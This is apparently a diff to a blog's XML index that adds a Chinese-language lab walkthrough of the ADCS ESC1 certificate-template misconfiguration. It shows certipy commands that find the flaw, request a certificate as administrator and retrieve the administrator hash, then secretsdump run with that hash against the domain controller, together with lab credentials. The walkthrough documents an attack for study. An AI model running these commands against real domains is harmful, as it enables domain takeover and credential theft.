@@ -4,6 +4,31 @@
   
   
   <entry>
+    <title>错误的 ADCS 模板配置-ESC1</title>
+    <link href="/2024/01/10/ADCS-ESC1/"/>
+    <url>/2024/01/10/ADCS-ESC1/</url>
+    
+    <content type="html"><![CDATA[<h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><p>点击证书颁发机构<br><img src="https://img.tucang.cc/api/image/show/d392205b6a4f05c13abee858ba6c86a5" alt="image.png"><br>证书模版 - 复制 工作站身份验证<br><img src="https://img.tucang.cc/api/image/show/411cc48cf7a2ab0b2cff7241abc41102" alt="image.png"><br>使用者名称：在请求中提供<br><img src="https://img.tucang.cc/api/image/show/6dc8181740651073e2885fac42dfc70b" alt="image.png"><br>扩展：应用程序策略配置客户端身份验证<br><img src="https://img.tucang.cc/api/image/show/03077e0f3a23419b7c42583148b53f8f" alt="image.png"><br>安全：增加 <code>domain users</code> 的注册权限<br><img src="https://img.tucang.cc/api/image/show/c69a155394e5a20795c9125bae8dc30e" alt="image.png"><br>颁布新模版<br><img src="https://img.tucang.cc/api/image/show/3a40f03e13f4d0613c7106cf5da03551" alt="image.png"></p><h2 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">certipy find -u kege@ust4.fun -p Cqk@123 -dc-ip 192.168.214.200 -vulnerable -debug<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/4f3d44fe08a47f9e3e66a03261c9d8ed" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">certipy find -u kege@ust4.fun -p Cqk@123 -dc-ip 192.168.214.200 -vulnerable -stdout -scheme ldap<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/db7ad6e119173f53dbc11a715e80b38c" alt="image.png"></p><h2 id="针对-ESC1-请求证书"><a href="#针对-ESC1-请求证书" class="headerlink" title="针对 ESC1 请求证书"></a>针对 ESC1 请求证书</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">certipy req -u kege@ust4.fun -p <span class="hljs-string">&#x27;Cqk@123&#x27;</span> -target 192.168.214.200 -ca UST4-DC01-CA -template esc1 -upn administrator@ust4.fun -debug<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/e00a42bf126d0aad9ebf70cabc47f6b5" alt="image.png"></p><h2 id="利用证书申请-HASH"><a href="#利用证书申请-HASH" class="headerlink" title="利用证书申请 HASH"></a>利用证书申请 HASH</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">certipy auth -pfx administrator.pfx -dc-ip 192.168.214.200<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/cd887e90655b35d20441950db3f61556" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[*] Got <span class="hljs-built_in">hash</span> <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;administrator@ust4.fun&#x27;</span>: aad3b435b51404eeaad3b435b51404ee:214114172ade9bb8d8feca6d765e0cf9<br></code></pre></td></tr></table></figure><h2 id="利用-HASH-进行横向"><a href="#利用-HASH-进行横向" class="headerlink" title="利用 HASH 进行横向"></a>利用 HASH 进行横向</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:214114172ade9bb8d8feca6d765e0cf9 ust4.fun/administrator@192.168.214.200<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/af0312be62ee2e9632cd8d05ab107f8a" alt="image.png"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>Web</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>Web</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>CVE-2022-26923 ADCS提权</title>
     <link href="/2024/01/09/CVE-2022-26923/"/>
     <url>/2024/01/09/CVE-2022-26923/</url>
